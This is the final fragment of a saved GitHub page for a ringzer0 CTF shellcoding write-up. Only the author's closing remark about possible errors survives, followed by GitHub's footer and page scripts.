<p>This writeup was written in two evenings of rigorously hacking away at the keyboard (the challenges were solved over several days). Therefore, errors will probably exist. If you find any, or have any suggestion or useful remark, please feel free to leave them in the comments!</p>
</article>
  </div>

    </div>

  

  <details class="details-reset details-overlay details-overlay-dark">
    <summary data-hotkey="l" aria-label="Jump to line" role="button"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast linejump" aria-label="Jump to line" role="dialog" aria-modal="true">
      <!-- '"` --><!-- </textarea></xmp> --><form class="js-jump-to-line-form Box-body d-flex" action="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md" accept-charset="UTF-8" method="get"><input name="utf8" type="hidden" value="✓">
        <input class="form-control flex-auto mr-3 linejump-input js-jump-to-line-field" type="text" placeholder="Jump to line…" aria-label="Jump to line" autofocus="">
        <button type="submit" class="btn" data-close-dialog="">Go</button>
</form>    </details-dialog>
  </details>

    <div class="Popover anim-scale-in js-tagsearch-popover" hidden="" data-tagsearch-url="/VulnHub/ctf-writeups/find-symbols" data-tagsearch-ref="master" data-tagsearch-path="2015/ringzer0/shellcoding.md" data-tagsearch-lang="Markdown" data-hydro-click="{&quot;event_type&quot;:&quot;code_navigation.click_on_symbol&quot;,&quot;payload&quot;:{&quot;action&quot;:&quot;click_on_symbol&quot;,&quot;repository_id&quot;:51316387,&quot;ref&quot;:&quot;master&quot;,&quot;client_id&quot;:&quot;1688231670.1559846310&quot;,&quot;originating_request_id&quot;:&quot;AD6C:73A5:197621:2A7FAD:5D08F86D&quot;,&quot;originating_url&quot;:&quot;https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md&quot;,&quot;referrer&quot;:&quot;https://www.google.com/&quot;,&quot;user_id&quot;:32180077}}" data-hydro-click-hmac="6929d19feafe05e447b15cb5370615d36fa2adf732e210f85d8537f870d8561e">
  <div class="Popover-message Popover-message--large Popover-message--top-left TagsearchPopover mt-1 mx-auto Box box-shadow-large">
    <div class="TagsearchPopover-content js-tagsearch-popover-content overflow-auto">
    </div>
  </div>
</div>



  </div>
  <div class="modal-backdrop js-touch-events"></div>
</div>

    </main>
  </div>
  

  </div>

        
<div class="footer container-lg width-full p-responsive" role="contentinfo">
  <div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
    <ul class="list-style-none d-flex flex-wrap col-12 col-lg-5 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
      <li class="mr-3 mr-lg-0">© 2019 <span title="0.68785s from unicorn-6b94fc857b-nn6wr">GitHub</span>, Inc.</li>
        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to terms, text:terms" href="https://github.com/site/terms">Terms</a></li>
        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to privacy, text:privacy" href="https://github.com/site/privacy">Privacy</a></li>
        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to security, text:security" href="https://github.com/security">Security</a></li>
        <li class="mr-3 mr-lg-0"><a href="https://githubstatus.com/" data-ga-click="Footer, go to status, text:status">Status</a></li>
        <li><a data-ga-click="Footer, go to help, text:help" href="https://help.github.com/">Help</a></li>
    </ul>

    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mx-lg-4" href="https://github.com/">
      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"></path></svg>
</a>
   <ul class="list-style-none d-flex flex-wrap col-12 col-lg-5 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
        <li class="mr-3 mr-lg-0"><a data-ga-click="Footer, go to contact, text:contact" href="https://github.com/contact">Contact GitHub</a></li>
        <li class="mr-3 mr-lg-0"><a href="https://github.com/pricing" data-ga-click="Footer, go to Pricing, text:Pricing">Pricing</a></li>
      <li class="mr-3 mr-lg-0"><a href="https://developer.github.com/" data-ga-click="Footer, go to api, text:api">API</a></li>
      <li class="mr-3 mr-lg-0"><a href="https://training.github.com/" data-ga-click="Footer, go to training, text:training">Training</a></li>
        <li class="mr-3 mr-lg-0"><a href="https://github.blog/" data-ga-click="Footer, go to blog, text:blog">Blog</a></li>
        <li><a data-ga-click="Footer, go to about, text:about" href="https://github.com/about">About</a></li>

    </ul>
  </div>
  <div class="d-flex flex-justify-center pb-6">
    <span class="f6 text-gray-light"></span>
  </div>
</div>



  <div id="ajax-error-message" class="ajax-error-message flash flash-error">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
    </button>
    You can’t perform that action at this time.
  </div>


    <script crossorigin="anonymous" integrity="sha512-BlCvumXWTvpASEdhCGiahDUDf7Bwb8QXA2XnnSnqJ9QafxcNcrNYUNYS2wXmd3nEpO//+zlZa9DSV9zmu5MqRg==" type="application/javascript" src="./shellcode_files/compat-bootstrap-90c0ace0.js"></script>
    <script crossorigin="anonymous" integrity="sha512-P3eW1tSt9yMTYl/1xec+Lu6c4gMoD1nzYkWtT8U4QbULnfRphxXsKzc6vlV2Kul5mRisdch6TWvANtRj7150OQ==" type="application/javascript" src="./shellcode_files/frameworks-369fa3dc.js"></script>
    
    <script crossorigin="anonymous" async="async" integrity="sha512-vyUBbeHLql9xiMSM69/yi2bE9dzZ2LWlteIwdsqfNh/7hGFLEvDMCFp0BVeBoWGpPlQQSWNHMQukx6tk7VDIAg==" type="application/javascript" src="./shellcode_files/github-bootstrap-68468d7e.js"></script>
    
    
    
  <div class="js-stale-session-flash stale-session-flash flash flash-warn flash-banner" hidden="">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg>
    <span class="signed-in-tab-flash">You signed in with another tab or window. <a href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md">Reload</a> to refresh your session.</span>
    <span class="signed-out-tab-flash">You signed out in another tab or window. <a href="https://github.com/VulnHub/ctf-writeups/blob/master/2015/ringzer0/shellcoding.md">Reload</a> to refresh your session.</span>
  </div>
  <template id="site-details-dialog"></template>

  <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;" tabindex="0">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box box-shadow-large" style="width:360px;">
  </div>
</div>

  <div aria-live="polite" class="js-global-screen-reader-notice sr-only"></div>

  


</body></html>